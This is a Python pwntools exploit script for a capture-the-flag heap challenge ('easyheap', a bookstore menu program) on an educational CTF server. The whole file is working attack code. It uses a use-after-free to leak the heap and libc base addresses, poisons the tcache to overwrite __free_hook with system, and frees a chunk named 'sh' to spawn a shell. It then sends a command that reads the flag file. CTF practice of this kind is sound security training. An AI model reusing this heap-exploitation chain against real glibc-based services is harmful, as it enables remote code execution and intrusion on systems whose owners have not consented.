from pwn import *

HOST, PORT = 'edu-ctf.zoolab.org', 30211
if args.HOST: HOST = args.HOST
if args.PORT: PORT = args.PORT

exe = context.binary = ELF('./easyheap/share/easyheap')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

if args.REMOTE:
    io = remote(HOST,PORT)
else:
    env = {}
    io = process(exe.path)
    pause()

def menu(opt):
    io.sendlineafter(b'> ', str(opt).encode())
def recv():
    return io.readuntil(b'--- happy bookstore ---', drop=True)
size = 0
def add(sz, name, price = 0):
    global size
    menu(1)
    io.sendlineafter(b':', str(size).encode())
    size += 1
    io.sendlineafter(b':', str(sz).encode())
    io.sendafter(b':', name)
    io.sendlineafter(b':', str(price).encode())
def delete(idx):
    menu(2)
    io.sendlineafter(b':', str(idx).encode())
def edit(idx, name, price = 0):
    menu(3)
    io.sendlineafter(b':', str(idx).encode())
    io.sendafter(b':', name)
    io.sendlineafter(b':', str(price).encode())
def show():
    menu(4)
    res = recv()
    res = res.split(b'--------------------')
    books = []
    for line in res:
        if line:
            line = line.split(b'Index:\t')[1]
            idx,line = line.split(b'\nName:\t')
            name,line = line.split(b'\nPrice:\t')
            price = line[:-1]
            book = (idx,name,price)
            books.append(book)
    return books
def find(idx):
    menu(5)
    io.sendlineafter(b':', str(idx).encode())
    io.readuntil(b': ')
    return recv()[:-1]

sz = 8
for i in range(sz):
    add(0xb0, b'sh\n')
for i in reversed(range(sz)):
    delete(i)

heap_base = int(show()[1][0]) - 0x10
info(f'heap base: {hex(heap_base)}')

add(0x100, b'sh\n')
add(0x20, p64(heap_base + 0x2d0))
libc.address = u64(find(3).ljust(8, b'\0')) - 0x1ebc90
info(f'libc base: {hex(libc.address)}')

edit(9, p64(libc.sym['__free_hook']))
edit(3, p64(libc.sym['system']))
delete(1)

if not args.REMOTE:
    io.interactive()
else:
    io.clean(1)
    io.sendline(b'cat /home/`whoami`/flag*')
    flag = io.readuntil(b'}').strip().decode()
    success(flag)
